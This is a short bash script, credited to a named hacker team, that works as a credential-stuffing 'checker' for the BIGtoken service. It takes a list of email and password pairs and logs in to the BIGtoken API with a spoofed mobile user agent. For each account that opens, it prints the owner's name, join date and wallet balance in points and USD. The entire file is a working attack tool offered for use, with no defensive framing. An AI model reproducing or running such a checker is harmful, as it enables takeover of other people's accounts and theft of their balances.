#!/usr/bin/env bash
# BIGTOKEN CHECKER
# By Versailles / Viloid
# Sec7or Team ~ Surabaya Hacker Link
# USAGE : ./script.sh list.txt (delim |)

login(){
	token=$(curl -s -H "Accept: application/json" -H "User-Agent: BIGtoken/1.0.6.2 Dalvik/2.1.0 Linux; U; Android 6.0; 4b2897bdd595f6a9 Build/25" https://api.bigtoken.com/login -d 'email='$1'&password='$2'' | grep -oP '"access_token":"\K[^"]+')
	if [[ -z $token ]]; then
		echo "[!] Login Failed"
	else
		id=$(curl -s 'https://api.bigtoken.com/users/profile' -H 'Origin: https://my.bigtoken.com' -H 'X-Requested-With: XMLHttpRequest' -H 'Authorization: Bearer '$token'' -H 'X-Srax-Big-Api-Version: 2' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Referer: https://my.bigtoken.com/dashboard' -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Mobile Safari/537.36' --compressed)
		name=$(echo $id | grep -oP '"first_name":"\K[^"]+')
		join=$(echo $id | grep -oP '"join_date":"\K[^"]+')
		info=$(curl -s 'https://api.bigtoken.com/users/wallet?filter=last_month' -H 'Origin: https://my.bigtoken.com' -H 'X-Requested-With: XMLHttpRequest' -H 'Authorization: Bearer '$token'' -H 'X-Srax-Big-Api-Version: 2' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Referer: https://my.bigtoken.com/wallet' -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Mobile Safari/537.36' --compressed)
		bal=$(echo $info | grep -oP '"total_balance":\K[^,]+')
		usd=$(echo $info | grep -oP '"usd_value":\K[^,]+')
		echo "[!] $1|$2 | $name | $join | Point : $bal / USD : $usd"
	fi
}

for i in $(cat $1); do
	IFS='|' read -ra em <<< "$i" 
	login "${em[0]}" "${em[1]}"
done
